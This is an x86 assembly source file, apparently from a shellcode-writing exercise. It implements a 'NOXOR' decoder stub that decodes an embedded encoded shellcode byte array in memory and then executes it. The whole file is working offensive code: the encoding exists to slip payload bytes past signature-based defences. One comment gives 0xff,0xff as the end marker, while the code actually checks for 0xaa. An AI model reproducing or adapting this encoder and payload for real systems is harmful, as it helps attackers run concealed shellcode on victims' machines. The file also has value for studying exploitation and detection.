; NOXOR Shellcode Encoder
; www.r3oath.com

; Copyright (c) 2013 Tristan Strathearn

; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:

; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.

; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
; THE SOFTWARE.

global _start

section .text

_start:

	jmp short call_decoder

decoder:
	
	; Grab the memory location of our shellcode
	pop esi

	; Do some register preperation
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

decode:
	
	; Check if we have hit the end of our shellcode 
	; (designated by the 0xff,0xff bytes)
	; if we have, jump and execute the shellcode
	mov cl, byte [esi]
	sub cl, 0xaa
	jz shellcode

	; Grab 2 bytes of our shellcode
	mov al, byte [esi +1]
	mov bl, byte [esi]

	; XOR the 1st byte of the pair
	xor bl, al
	
	; NOT the 2nd byte of the pair
	not al

	; Overwrite the 2 encoded bytes with the decoded ones
	mov byte [esi], bl
	mov byte [esi + 1], al

	; Increment our location memory pointer 2 bytes 
	; (prepare for the next pair of bytes)
	inc esi
	inc esi

	; Keep looping
	jmp short decode

call_decoder:
	
	; Place the NOXOR encoded shellcode below...
	call decoder
	shellcode: db 0x0e,0x3f,0xc7,0x97,0xff,0xd0,0xe4,0x97,0xb8,0xd0,0xf4,0x96,0x18,0x76,0x4c,0xaf,0x94,0x1d,0x25,0x76,0xae,0x4f,0x39,0x32,0xef,0x6f,0xaa,0xaa
